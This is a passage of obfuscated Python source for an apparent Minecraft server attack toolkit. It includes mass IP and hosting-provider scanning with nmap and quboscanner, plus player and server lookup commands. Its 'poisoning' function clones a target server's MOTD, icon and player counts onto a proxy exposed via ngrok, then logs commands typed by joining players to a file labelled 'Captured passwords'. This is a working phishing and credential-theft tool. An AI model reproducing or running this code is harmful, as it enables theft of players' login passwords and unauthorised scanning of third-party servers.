            print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}No IP addresses found in the file!")#line:598
            return #line:599
        return #line:601
    except FileNotFoundError :#line:603
        print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}File not found.")#line:604
        return #line:605
def bungee_command (OOO0OOOOO00O000O0 ):#line:608
    ""#line:609
    print (f"\n     {lblack}[{lred}PRO{white}XY{lblack}] {white}Starting proxy..")#line:610
    O0000O0OO00OOOO0O =open ("config/files/config_bungee.txt","r")#line:612
    O0O000O00OO00O000 =O0000O0OO00OOOO0O .read ()#line:613
    O0000O0OO00OOOO0O .close ()#line:614
    O0000O0OO00OOOO0O =open ("config/bungee/config.yml","w+")#line:616
    O0000O0OO00OOOO0O .truncate (0 )#line:617
    O0000O0OO00OOOO0O .write (O0O000O00OO00O000 )#line:618
    O0000O0OO00OOOO0O .write (f"\n    address: {str(OOO0OOOOO00O000O0)}\n")#line:619
    O0000O0OO00OOOO0O .write (f"    restricted: false")#line:620
    O0000O0OO00OOOO0O .close ()#line:621
    OOO0O0O00OOOO0O00 =subprocess .Popen ("cd config/bungee && java -Xms512M -Xmx512M -jar WaterFall.jar >nul 2>&1",stdout =subprocess .PIPE ,shell =True )#line:622
    print (f"\n     {lblack}[{lred}I{white}P{lblack}] {white}127.0.0.1:33330 \n\n     {lblack}[{white}#{lblack}] {white}Press ctrl c to stop the proxy")#line:623
    try :#line:625
        while True :#line:626
            pass #line:627
    except KeyboardInterrupt :#line:629
        print (f"\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")#line:630
        OOO0O0O00OOOO0O00 .kill ()#line:631
def poisoning_command (O00000000O0000OOO ,O00000O0O000O0O00 ,O00000OOO00OO0000 ):#line:634
    ""#line:635
    check_folder ("results")#line:636
    check_folder ("results/poisoning")#line:637
    O00O0O0O0O0O00O00 =" "#line:638
    OO0OOO0O0O00O0OO0 =requests .get (f"{mcsrvstat_api}{O00000000O0000OOO}")#line:640
    OO0OOO00O0OO0OO00 =OO0OOO0O0O00O0OO0 .json ()#line:641
    O0OOOOO0OO00OO00O =OO0OOO00O0OO0OO00 ["players"]["online"]#line:642
    O00O0O000O0OO0O0O =OO0OOO00O0OO0OO00 ["players"]["max"]#line:643
    O00OO00O0OO000OOO =OO0OOO00O0OO0OO00 ["motd"]["raw"]#line:644
    os .remove ("config/poisoning/server-icon.png")#line:645
    try :#line:647
        O00OO0O00OOO000O0 =OO0OOO00O0OO0OO00 ["icon"]#line:648
        OO00OOOO000O00OOO =O00OO0O00OOO000O0 .replace ("data:image/png;base64,","")#line:649
        OO0OO00O000OO0O0O =base64 .b64decode (OO00OOOO000O00OOO )#line:650
        with open (f"config/poisoning/server-icon.png","wb")as OO00OO0O0OO0OOOOO :#line:652
            OO00OO0O0OO0OOOOO .write (OO0OO00O000OO0O0O )#line:653
    except :#line:655
        shutil .copy ("config/files/default-icon.png","config/poisoning/server-icon.png")#line:656
    try :#line:658
        _O0OO0000O000OO0O0 =O00OO00O0OO000OOO [0 ]#line:659
        _O0OO0000O000OO0O0 =O00OO00O0OO000OOO [1 ]#line:660
        O0OOO000O0O0O00O0 =1 #line:661
    except :#line:663
        O0OOO000O0O0O00O0 =0 #line:664
    OO0O000OOOOOO0OOO =open ("config/files/config_poisoning.txt","r+")#line:666
    OO0OO0OO00OOO00OO =OO0O000OOOOOO0OOO .read ()#line:667
    OO0O000OOOOOO0OOO .close ()#line:668
    O000O0OO0000OOO0O =re .sub ("0.0.0.0:[0-9][0-9][0-9][0-9][0-9]",f"0.0.0.0:{O00000O0O000O0O00}",OO0OO0OO00OOO00OO )#line:669
    OO0O000OOOOOO0OOO =open ("config/poisoning/config.yml","w+",encoding ="utf8")#line:670
    OO0O000OOOOOO0OOO .truncate (0 )#line:671
    OO0O000OOOOOO0OOO .write (O000O0OO0000OOO0O )#line:672
    OO0O000OOOOOO0OOO .write (f"\n    address: {str(O00000000O0000OOO)}\n")#line:673
    OO0O000OOOOOO0OOO .write (f"    restricted: false")#line:674
    OO0O000OOOOOO0OOO .close ()#line:675
    O0O0O00OOOO0O0OOO =open ("config/poisoning/plugins/CleanMOTD/config.yml","w+",encoding ="utf8")#line:676
    O0O0O00OOOO0O0OOO .truncate (0 )#line:677
    O0O0O00OOOO0O0OOO .write (motd_1 )#line:678
    O0O0O00OOOO0O0OOO .write (f"  maxplayers: {O00O0O000O0OO0O0O}")#line:679
    O0O0O00OOOO0O0OOO .write (motd_2 )#line:680
    O0O0O00OOOO0O0OOO .write (f"  amount: {O0OOOOO0OO00OO00O}")#line:681
    O0O0O00OOOO0O0OOO .write (motd_3 )#line:682
    OO000O00O0O00OOOO =save_logs (O00000000O0000OOO ,"results/poisoning/poisoning","POISONING LOGS","SERVER","Captured passwords")#line:684
    if O0OOO000O0O0O00O0 ==1 :#line:686
        O0O0O00OOOO0O0OOO .write (f"        {O00OO00O0OO000OOO[0]}")#line:687
        O0O0O00OOOO0O0OOO .write (f"        {O00OO00O0OO000OOO[1]}")#line:688
    else :#line:690
        O0O0O00OOOO0O0OOO .write (f'        {O00OO00O0OO000OOO[0]}')#line:691
    O0O0O00OOOO0O0OOO .close ()#line:693
    os .system ("cls || clear")#line:694
    check_folder ("config/poisoning/plugins/RPoisoner")#line:695
    check_file ("config/poisoning/plugins/RPoisoner/commands.txt")#line:696
    print (banner ,f"\n     {lblack}[{lred}PRO{white}XY{lblack}] {white}Starting proxy..")#line:697
    time .sleep (1 )#line:698
    OO0OO000OO0OO00OO =subprocess .Popen ("cd config/poisoning && java -Xms512M -Xmx512M -jar WaterFall.jar >nul 2>&1",stdout =subprocess .PIPE ,shell =True )#line:699
    print (f"\n     {lblack}[{lred}NGR{white}OK{lblack}] {white}Starting ngrok..")#line:700
    OO00O0OOOO000OOO0 =subprocess .Popen (O00000OOO00OO0000 ,stdout =subprocess .PIPE ,shell =True )#line:701
    time .sleep (1 )#line:702
    OOO0O0O0000O0O000 =get_ngrok_ip ()#line:704
    print (f"\n     {lblack}[{lred}I{white}P{lblack}] {white}{str(OOO0O0O0000O0O000)}")#line:706
    print (f"\n     {lblack}[{lred}I{white}P{lblack}] {white}127.0.0.1:{O00000O0O000O0O00}")#line:707
    print (f"\n     {lblack}[{white}#{lblack}] {white}Waiting for commands..\n")#line:708
    while True :#line:710
        try :#line:711
            time .sleep (1 )#line:712
            O0O00O0O00O00O000 =open ("config/poisoning/plugins/RPoisoner/commands.txt","r+",encoding ="unicode_escape")#line:713
            OOOOOO0O0000OO00O =O0O00O0O00O00O000 .readlines ()#line:714
            if OOOOOO0O0000OO00O ==O00O0O0O0O0O00O00 :#line:716
                continue #line:717
            O00O0O0O0O0O00O00 =OOOOOO0O0000OO00O #line:719
            for O0OOO00O0O0O00OO0 in OOOOOO0O0000OO00O :#line:721
                print (f"     {lblack}[{lgreen}!{lblack}] {white}Command captured {O0OOO00O0O0O00OO0}")#line:722
                with open (OO000O00O0O00OOOO ,"a")as OO00OO0O0OO0OOOOO :#line:723
                    OO00OO0O0OO0OOOOO .write (f"Player {O0OOO00O0O0O00OO0}")#line:724
        except KeyboardInterrupt :#line:726
            OO00O0OOOO000OOO0 .kill ()#line:727
            OO0OO000OO0OO00OO .kill ()#line:728
            break #line:729
def qubo_command (O0O00000OO0000OO0 ,OOO0OOOOO0O000OOO ,O0OO000O0O0OOOO0O ,O00OO0O00000O0O00 ,O0000000O0OOO0O00 ):#line:732
    ""#line:733
    OO00O0000O0OOO000 ="unknown"#line:734
    OOOO0OO0O000OO000 =[]#line:735
    os .system ("cls || clear")#line:737
    check_folder ("results")#line:738
    check_folder ("results/qubo")#line:739
    check_folder ("config/qubo/outputs")#line:740
    O00O0O00OOOOOOOO0 =os .listdir ("config/qubo/outputs")#line:741
    print (banner ,f"\n     {lblack}[{lred}SCAN{white}NER{lblack}] {white}Scanning {green}{O0O00000OO0000OO0} with quboscanner{white}.. \n\n     {white}[{lcyan}INFO{white}] {white}Remember that you cannot have the vpn activated to scan!")#line:742
    os .system (f"cd config/qubo && java -Dfile.encoding=UTF-8 -jar qubo.jar -range {O0O00000OO0000OO0} -ports {OOO0OOOOO0O000OOO} -th {O0OO000O0O0OOOO0O} -ti {O00OO0O00000O0O00} >nul 2>&1")#line:744
    OO0000O00000000OO =os .listdir ("config/qubo/outputs")#line:745
    for OO0OOOOOO00OO0O00 in OO0000O00000000OO :#line:747
        if OO0OOOOOO00OO0O00 in O00O0O00OOOOOOOO0 :#line:748
            pass #line:749
        else :#line:750
            OO00O0000O0OOO000 =OO0OOOOOO00OO0O00 #line:751
    if OO00O0000O0OOO000 =="unknown":#line:753
        print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid IP")#line:754
        return #line:755
    O0OO0OO0O0OOO0000 =check_encoding (f"config/qubo/outputs/{OO00O0000O0OOO000}")#line:757
    with open (f"config/qubo/outputs/{OO00O0000O0OOO000}",encoding =O0OO0OO0O0OOO0000 )as OO0O0O00O00OO00O0 :#line:759
        for O000O000O00O00000 in OO0O0O00O00OO00O0 :#line:760
            OOOOOOOOOO000OO0O =re .findall ("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}",O000O000O00O00000 )#line:761
            OOOOOOOOOO000OO0O =" ".join (OOOOOOOOOO000OO0O )#line:762
            if ":"in OOOOOOOOOO000OO0O :#line:763
                OOOO0OO0O000OO000 .append (f"{OOOOOOOOOO000OO0O}")#line:764
    if len (OOOO0OO0O000OO000 )==0 :#line:766
        print (f"\n{white}     The scan ended and found {lred}0 {white}servers.")#line:767
        return #line:768
    OOO0OOO000OOOO00O =save_logs (O0O00000OO0000OO0 ,"results/qubo/qubo","QUBO LOGS","TARGET","Servers found")#line:770
    for O0OO000OO0OO0O000 in OOOO0OO0O000OO000 :#line:772
        get_server (O0OO000OO0OO0O000 ,O0000000O0OOO0O00 ,OOO0OOO000OOOO00O )#line:773
def host_command (O0O0OO00O0O0000OO ,OOOO0OO0OOOO00OO0 ,O00O0O0OOOO0O00OO ):#line:776
    ""#line:777
    check_folder ("results")#line:778
    check_folder ("results/host")#line:779
    O0OOO0OOO0OOO00OO =[]#line:780
    OOO00OOO0OOOOOO0O =""#line:781
    O00O0O0O0OOO0OO0O =""#line:782
    O0OO0O00OOO000OO0 =0 #line:783
    if O0O0OO00O0O0000OO =="minehost":#line:785
        check_folder ("results/host/minehost")#line:786
        OOO00OOO0OOOOOO0O =("sv1","sv10","sv11","sv15","sv16","sv17")#line:787
        O00O0O0O0OOO0OO0O =".minehost.com.ar"#line:788
    if O0O0OO00O0O0000OO =="holyhosting":#line:790
        check_folder ("results/host/holyhosting")#line:791
        OOO00OOO0OOOOOO0O =("node-germany","node-newyork","ca","tx2","node-cl2","node-ashburn","node-premium3","node-dallas","premium2","node-valdivia","node-premium","ar","node-premiumar","node-argentina")#line:792
        O00O0O0O0OOO0OO0O =".holy.gg"#line:793
    if O0O0OO00O0O0000OO =="vultam":#line:795
        check_folder ("results/host/vultam")#line:796
        OOO00OOO0OOOOOO0O =("ca","ca02","ca03","ca04","ca05","ca06","ca07","mia","mia02","mia03","mia04","mia05","mia06","mia07","mia08","mia09","mia10","mia12","mia13","mia14","mia15","mia16","fr01","fr02","fr03","ny","ny02","ny04","ny05","ny06","ny07","de","de02")#line:797
        O00O0O0O0OOO0OO0O =".vultam.net"#line:798
    OOO00O0O0O0OOO0O0 =save_logs (O0O0OO00O0O0000OO ,f"results/host/{O0O0OO00O0O0000OO}/{host}","HOST LOGS","HOST","Servers found")#line:800
    os .system ("cls || clear")#line:802
    print (banner ,f"\n     {white}[{lgreen}#{white}] {white}Scanning the hosting {green}{O0O0OO00O0O0000OO}{white}.. \n\n     {white}[{lcyan}INFO{white}] {white}Remember that you cannot have the vpn activated to scan!")#line:803
    time .sleep (1 )#line:804
    for O00O0OOOOOO0O000O in OOO00OOO0OOOOOO0O :#line:806
        try :#line:807
            O0OO00000O000O000 =socket .gethostbyname (f"{str(O00O0OOOOOO0O000O)}{str(O00O0O0O0OOO0OO0O)}")#line:808
            O0OOO0OOO0OOO00OO .append (O0OO00000O000O000 )#line:809
            O0OO0O00OOO000OO0 +=1 #line:810
        except :#line:811
            pass #line:812
    if O0OO0O00OOO000OO0 ==0 :#line:814
        print (f"\n     {lblack}[{lred}-{lblack}] {white}No active nodes were found. Try again later")#line:815
        return #line:816
    print (f"\n     {lblack}[{lgreen}+{lblack}] {white}Found nodes: {O0OO0O00OOO000OO0}")#line:818
    for O00O0OOOOOO0O000O in O0OOO0OOO0OOO00OO :#line:820
        nmap_scan ("host",O00O0OOOOOO0O000O ,OOOO0OO0OOOO00OO0 ,O00O0O0OOOO0O00OO ,OOO00O0O0O0OOO0O0 )#line:821
def mods_command (O0000OO0OO0OO00OO ):#line:824
    ""#line:825
    try :#line:826
        O00OOOOOOO000000O =requests .get (f"{mcsrvstat_api}{O0000OO0OO0OO00OO}")#line:827
        O000OO0O0O000OOOO =O00OOOOOOO000000O .json ()#line:828
        O0O00OOO0OO000OOO =O000OO0O0O000OOOO ["mods"]["names"]#line:829
        print (f"\n     {lblack}[{lred}MO{white}DS{lblack}] {white}Mods found: {lgreen}",end ="")#line:830
        for _O0OOO00OOOOOOO0OO in O0O00OOO0OO000OOO :#line:832
            print (f"{_O0OOO00OOOOOOO0OO} ",end ="")#line:833
        print ("")#line:835
    except KeyboardInterrupt :#line:837
        pass #line:838
    except TimeoutError :#line:840
        print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")#line:841
    except KeyError :#line:843
        print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}I couldn't find the mods for this server!")#line:844
    except :#line:846
        print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}I couldn't find the mods for this server!")#line:847
def listening_command (OOO0OO000OOO00OO0 ):#line:850
    ""#line:851
    O0O00OOOO0O000000 =[]#line:852
    OO0O00O0000000OO0 =False #line:853
    print (f"\n     {lblack}[{lred}LISTE{white}NING{lblack}] {white}Waiting for the players..")#line:854
    while True :#line:856
        try :#line:857
            O0OOO00OO00OO0OO0 =MinecraftServer .lookup (OOO0OO000OOO00OO0 )#line:858
            OOO000O0OOO000OO0 =O0OOO00OO00OO0OO0 .status ()#line:859
            if OOO000O0OOO000OO0 .players .sample is not None :#line:860
                for O0OO0OOO0OOOOO00O in OOO000O0OOO000OO0 .players .sample :#line:861
                    if O0OO0OOO0OOOOO00O .name !="":#line:862
                        if not OO0O00O0000000OO0 :#line:863
                            print (f"\n     {lblack}[{lred}FOU{white}ND{lblack}] {white}Players found: {lgreen}",end ="")#line:864
                            OO0O00O0000000OO0 =True #line:865
                        if f"{O0OO0OOO0OOOOO00O.name} ({O0OO0OOO0OOOOO00O.id})"not in O0O00OOOO0O000000 :#line:867
                            OO00000O0OO0OO0O0 =f"{O0OO0OOO0OOOOO00O.name} ({O0OO0OOO0OOOOO00O.id})"#line:868
                            O0O00OOOO0O000000 .append (OO00000O0OO0OO0O0 )#line:869
                            print (f"{OO00000O0OO0OO0O0}, ",end ="")#line:870
                            sys .stdout .flush ()#line:871
            time .sleep (1 )#line:873
        except KeyboardInterrupt :#line:875
            print (f"\n\n     {lblack}[{lred}CTRL{white}-C{lblack}] {white}Stopping..")#line:876
            return #line:877
        except Exception as OO00OO00OO00O0O00 :#line:879
            print (OO00OO00OO00O0O00 )#line:880
            pass #line:881
def server_command (OOOO0OOOO00O0OOO0 ):#line:884
    ""#line:885
    O00OOO000O0OOOO00 =None #line:886
    try :#line:888
        try :#line:889
            OO0OO00O0OOOO00OO =requests .get (f"{mcsrvstat_api}{OOOO0OOOO00O0OOO0}")#line:890
            O0O0O0O0O0OOO000O =OO0OO00O0OOOO00OO .json ()#line:891
            OO0OOO0O0O000OOOO =O0O0O0O0O0OOO000O ["ip"]#line:892
            OO00OOO0OO000OO00 =O0O0O0O0O0OOO000O ["port"]#line:893
        except :#line:895
            OO0OOO0O0O000OOOO ="127.0.0.1"#line:896
            OO00OOO0OO000OO00 =25565 #line:897
        O00OOOO0OO0000OOO =MinecraftServer .lookup (OOOO0OOOO00O0OOO0 )#line:899
        OOOOOO0000000OO0O =O00OOOO0OO0000OOO .status ()#line:901
        O00OO0OOOO00O0000 =mc_replace_text_mccolors (OOOOOO0000000OO0O .description )#line:902
        O0O0OO00OOOOOO000 =mc_replace_text_mccolors (OOOOOO0000000OO0O .version .name )#line:903
        if OOOOOO0000000OO0O .players .sample is not None :#line:905
            O00OOO000O0OOOO00 =str ([f"{O000OO000O0O0OO0O.name} ({O000OO000O0O0OO0O.id})"for O000OO000O0O0OO0O in OOOOOO0000000OO0O .players .sample ])#line:906
            O00OOO000O0OOOO00 =O00OOO000O0OOOO00 .replace ("[","").replace ("]","").replace ("'","")#line:907
        print (f"\n     {lblack}[{lred}I{white}P{lblack}] {white}{OO0OOO0O0O000OOOO}:{OO00OOO0OO000OO00}")#line:909
        print (f"     {lblack}[{lred}MO{white}TD{lblack}] {white}{O00OO0OOOO00O0000}")#line:910
        print (f"     {lblack}[{lred}Ver{white}sion{lblack}] {white}{O0O0OO00OOOOOO000}")#line:911
        print (f"     {lblack}[{lred}Proto{white}col{lblack}] {white}{OOOOOO0000000OO0O.version.protocol}")#line:912
        print (f"     {lblack}[{lred}Play{white}ers{lblack}] {white}{OOOOOO0000000OO0O.players.online}{lblack}/{white}{OOOOOO0000000OO0O.players.max}")#line:913
        if OOOOOO0000000OO0O .players .sample is not None :#line:915
            if O00OOO000O0OOOO00 !="":#line:916
                print (f"     {lblack}[{lred}Nam{white}es{lblack}] {white}{O00OOO000O0OOOO00}")#line:917
    except KeyboardInterrupt :#line:919
        pass #line:920
    except TimeoutError :#line:922
        print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")#line:923
    except :#line:925
        print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Enter a valid server.")#line:926
def player_command (O0000O0OOOOO0OOO0 ):#line:929
    ""#line:930
    try :#line:931
        O0OO0O00O00O0O0O0 =requests .get (f"{mojang_api}{O0000O0OOOOO0OOO0}")#line:932
        O00000000O0000O00 =O0OO0O00O00O0O0O0 .json ()#line:933
        OOO0O0O0OO00O0O0O =O00000000O0000O00 ["id"]#line:934
        O0OOO0O0OOOO00000 =f"{OOO0O0O0OO00O0O0O[0:8]}-{OOO0O0O0OO00O0O0O[8:12]}-{OOO0O0O0OO00O0O0O[12:16]}-{OOO0O0O0OO00O0O0O[16:21]}-{OOO0O0O0OO00O0O0O[21:32]}"#line:935
        OO00OOOOOO000O0OO =str (uuid .UUID (bytes =hashlib .md5 (bytes (f"OfflinePlayer:{O0000O0OOOOO0OOO0}","utf-8")).digest ()[:16 ],version =3 ))#line:937
        O0OO0O0O0O00OO000 =OO00OOOOOO000O0OO .replace ("-","")#line:938
        print (f"\n{lblack}     [{lred}UU{white}ID{lblack}] {white}{O0OOO0O0OOOO00000}")#line:940
        print (f"{lblack}     [{lred}UU{white}ID{lblack}] {white}{OOO0O0O0OO00O0O0O}\n")#line:941
        print (f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{OO00OOOOOO000O0OO}")#line:942
        print (f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{O0OO0O0O0O00OO000}")#line:943
    except KeyboardInterrupt :#line:945
        pass #line:946
    except JSONDecodeError :#line:948
        OO00OOOOOO000O0OO =str (uuid .UUID (bytes =hashlib .md5 (bytes (f"OfflinePlayer:{O0000O0OOOOO0OOO0}","utf-8")).digest ()[:16 ],version =3 ))#line:949
        O0OO0O0O0O00OO000 =OO00OOOOOO000O0OO .replace ("-","")#line:950
        print (f"\n{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{OO00OOOOOO000O0OO}")#line:951
        print (f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{O0OO0O0O0O00OO000}")#line:952
    except requests .exceptions .ConnectionError :#line:954
        print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Connection error.")#line:955
    except :#line:957
        OO00OOOOOO000O0OO =str (uuid .UUID (bytes =hashlib .md5 (bytes (f"OfflinePlayer:{O0000O0OOOOO0OOO0}","utf-8")).digest ()[:16 ],version =3 ))#line:958
        O0OO0O0O0O00OO000 =OO00OOOOOO000O0OO .replace ("-","")#line:959
        print (f"\n{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{OO00OOOOOO000O0OO}")#line:960
        print (f"{lblack}     [{lred}UUID{white} Offline{lblack}] {white}{O0OO0O0O0O00OO000}")#line:961
def main ():#line:964
    ""#line:965
    global number_of_servers ,sfile #line:966
    OO0O0O0000O00O0O0 =input ().split ()#line:968
    if len (OO0O0O0000O00O0O0 )==0 :#line:970
        print (f"\n     {lblack}[{red}-{lblack}] {lred}Unknown command. Type help to see the available commands.")#line:971
    try :#line:973
        sfile =False #line:974
        O000OO00000O000O0 =OO0O0O0000O00O0O0 [0 ]#line:975
        if O000OO00000O000O0 .lower ()=="help":#line:977
            print (help_message )#line:978
        elif O000OO00000O000O0 .lower ()=="cls"or O000OO00000O000O0 .lower ()=="clear":#line:980
            os .system ("cls || clear")#line:981
            print (banner )#line:982
        elif O000OO00000O000O0 .lower ()=="server"or O000OO00000O000O0 .lower ()=="srv":#line:984
            try :#line:985
                OO0OOOO0O00O0OOO0 =OO0O0O0000O00O0O0 [1 ]#line:986
                server_command (OO0OOOO0O00O0OOO0 )#line:987
            except IndexError :#line:989
                print (f"\n{white}     Usage: {O000OO00000O000O0.lower()} [domain] or [ip:port]")#line:990
            except Exception as OOOO00O0OO0O0OO0O :#line:992
                if DEBUG :#line:993
                    print (f"     [DEBUG] Exception (Server): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:994
        elif O000OO00000O000O0 .lower ()=="player":#line:996
            try :#line:997
                O0O0O00OOO0O0O00O =OO0O0O0000O00O0O0 [1 ]#line:998
                player_command (O0O0O00OOO0O0O00O )#line:999
            except IndexError :#line:1001
                print (f"\n{white}     Usage: player [name]")#line:1002
            except Exception as OOOO00O0OO0O0OO0O :#line:1004
                if DEBUG :#line:1005
                    print (f"     [DEBUG] Exception (Player): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1006
        elif O000OO00000O000O0 .lower ()=="scan":#line:1008
            try :#line:1009
                O0O0O0OOO0O0O0OOO =OO0O0O0000O00O0O0 [1 ]#line:1010
                O0OO0O000OOO0O00O =OO0O0O0000O00O0O0 [2 ]#line:1011
                OO0OOOOOOO0O000O0 =check_nmap ()#line:1012
                if OO0OOOOOOO0O000O0 :#line:1014
                    O00OO00OO00OO0OOO =skip_0on ()#line:1015
                    O0O00OO0O0OO0O0OO =check_node ()#line:1016
                    if O0O00OO0O0OO0O0OO :#line:1017
                        bot_check ()#line:1018
                    number_of_servers =0 #line:1020
                    nmap_scan ("scan",O0O0O0OOO0O0O0OOO ,O0OO0O000OOO0O00O ,O00OO00OO00OO0OOO ,None )#line:1021
                    print (f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")#line:1022
            except IndexError :#line:1024
                print (f"\n{white}     Usage: scan [ip] [ports]")#line:1025
            except Exception as OOOO00O0OO0O0OO0O :#line:1027
                if DEBUG :#line:1028
                    print (f"     [DEBUG] Exception (Scan): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1029
        elif O000OO00000O000O0 .lower ()=="host":#line:1031
            try :#line:1032
                OOO00000OOOOO00OO =OO0O0O0000O00O0O0 [1 ].lower ()#line:1033
                O0OO0O000OOO0O00O =OO0O0O0000O00O0O0 [2 ]#line:1034
                OO0OOOOOOO0O000O0 =check_nmap ()#line:1035
                if OO0OOOOOOO0O000O0 :#line:1037
                    if OOO00000OOOOO00OO in host_list :#line:1038
                        O00OO00OO00OO0OOO =skip_0on ()#line:1039
                        O0O00OO0O0OO0O0OO =check_node ()#line:1040
                        if O0O00OO0O0OO0O0OO :#line:1041
                            bot_check ()#line:1042
                        number_of_servers =0 #line:1044
                        host_command (OOO00000OOOOO00OO ,O0OO0O000OOO0O00O ,O00OO00OO00OO0OOO )#line:1045
                        print (f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")#line:1046
                    else :#line:1048
                        print (f"\n     {lblack}[{lred}ERR{white}OR{lblack}] {white}Host not found! \n     {white}Available hosts (minehost, holyhosting, vultam){reset}")#line:1049
            except IndexError :#line:1051
                print (f"\n{white}     Usage: host [host] [ports]")#line:1052
            except Exception as OOOO00O0OO0O0OO0O :#line:1054
                if DEBUG :#line:1055
                    print (f"     [DEBUG] Exception (Host): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1056
        elif O000OO00000O000O0 .lower ()=="qubo":#line:1058
            try :#line:1059
                O0O0O0OOO0O0O0OOO =OO0O0O0000O00O0O0 [1 ]#line:1060
                O0OO0O000OOO0O00O =OO0O0O0000O00O0O0 [2 ]#line:1061
                OOO00OO00O0O0OOOO =OO0O0O0000O00O0O0 [3 ]#line:1062
                O00O0OO00OOO0O000 =OO0O0O0000O00O0O0 [4 ]#line:1063
                O0O00O0OOOOO0O00O =check_java ()#line:1064
                if O0O00O0OOOOO0O00O :#line:1066
                    O0OO0O000O0OO00O0 =check_qubo (OOO00OO00O0O0OOOO ,O00O0OO00OOO0O000 )#line:1067
                    if O0OO0O000O0OO00O0 :#line:1068
                        O00OO00OO00OO0OOO =skip_0on ()#line:1069
                        O0O00OO0O0OO0O0OO =check_node ()#line:1070
                        if O0O00OO0O0OO0O0OO :#line:1071
                            bot_check ()#line:1072
                        number_of_servers =0 #line:1074
                        qubo_command (O0O0O0OOO0O0O0OOO ,O0OO0O000OOO0O00O ,OOO00OO00O0O0OOOO ,O00O0OO00OOO0O000 ,O00OO00OO00OO0OOO )#line:1075
                        print (f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")#line:1076
            except IndexError :#line:1078
                print (f"\n{white}     Usage: qubo [ip] [ports] [threads] [timeout]")#line:1079
            except Exception as OOOO00O0OO0O0OO0O :#line:1081
                if DEBUG :#line:1082
                    print (f"     [DEBUG] Exception (Qubo): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1083
        elif O000OO00000O000O0 .lower ()=="sfile":#line:1085
            try :#line:1086
                O0O00O0O0OOOO0O0O =OO0O0O0000O00O0O0 [1 ]#line:1087
                O0OO0O000OOO0O00O =OO0O0O0000O00O0O0 [2 ]#line:1088
                OO0OOOOOOO0O000O0 =check_nmap ()#line:1089
                if OO0OOOOOOO0O000O0 :#line:1091
                    O00OO00OO00OO0OOO =skip_0on ()#line:1092
                    O0O00OO0O0OO0O0OO =check_node ()#line:1093
                    if O0O00OO0O0OO0O0OO :#line:1094
                        bot_check ()#line:1095
                    O00O000O0O0O00O0O =iplist (O0O00O0O0OOOO0O0O )#line:1097
                    if O00O000O0O0O00O0O [0 ]:#line:1098
                        number_of_servers =0 #line:1099
                        for O00O00000O0O00OOO in O00O000O0O0O00O0O [1 ]:#line:1100
                            nmap_scan ("scan",O00O00000O0O00OOO ,O0OO0O000OOO0O00O ,O00OO00OO00OO0OOO ,None )#line:1101
                            sfile =True #line:1102
                        print (f"\n{white}     {lblack}[{lred}FINI{white}SHED{lblack}] {white}The scan finished and found {number_of_servers} servers")#line:1104
            except IndexError :#line:1106
                print (f"\n{white}     Usage: sfile [file] [ports]")#line:1107
            except Exception as OOOO00O0OO0O0OO0O :#line:1109
                if DEBUG :#line:1110
                    print (f"     [DEBUG] Exception (SFile): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1111
        elif O000OO00000O000O0 .lower ()=="mods":#line:1113
            try :#line:1114
                O0O0O0OOO0O0O0OOO =OO0O0O0000O00O0O0 [1 ]#line:1115
                O0O00O00O00OO00OO =check_server (O0O0O0OOO0O0O0OOO )#line:1116
                if O0O00O00O00OO00OO :#line:1118
                    mods_command (O0O0O0OOO0O0O0OOO )#line:1119
            except IndexError :#line:1121
                print (f"\n{white}     Usage: mods [ip:port]")#line:1122
            except Exception as OOOO00O0OO0O0OO0O :#line:1124
                if DEBUG :#line:1125
                    print (f"     [DEBUG] Exception (Mods): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1126
        elif O000OO00000O000O0 .lower ()=="listening":#line:1128
            try :#line:1129
                O0O0O0OOO0O0O0OOO =OO0O0O0000O00O0O0 [1 ]#line:1130
                O0O00O00O00OO00OO =check_server (O0O0O0OOO0O0O0OOO )#line:1131
                if O0O00O00O00OO00OO :#line:1133
                    listening_command (O0O0O0OOO0O0O0OOO )#line:1134
            except IndexError :#line:1136
                print (f"\n{white}     Usage: listening [ip:port]")#line:1137
            except Exception as OOOO00O0OO0O0OO0O :#line:1139
                if DEBUG :#line:1140
                    print (f"     [DEBUG] Exception (Qubo): {OOOO00O0OO0O0OO0O} \n\n{traceback.format_exc()}")#line:1141
        elif O000OO00000O000O0 .lower ()=="checker":#line:1143
            try :#line:1144
                O0O00O0O0OOOO0O0O =OO0O0O0000O00O0O0 [1 ]#line:1145
                OO0OOOOOOO0O000O0 =check_nmap ()#line:1146
                if OO0OOOOOOO0O000O0 :#line:1148
                    O00OO00OO00OO0OOO =skip_0on ()#line:1149
                    O0O00OO0O0OO0O0OO =check_node ()#line:1150
                    if O0O00OO0O0OO0O0OO :#line:1151
                        bot_check ()#line:1152
                    number_of_servers =0 #line:1154
                    checker_command (O0O00O0O0OOOO0O0O ,O00OO00OO00OO0OOO )#line:1155
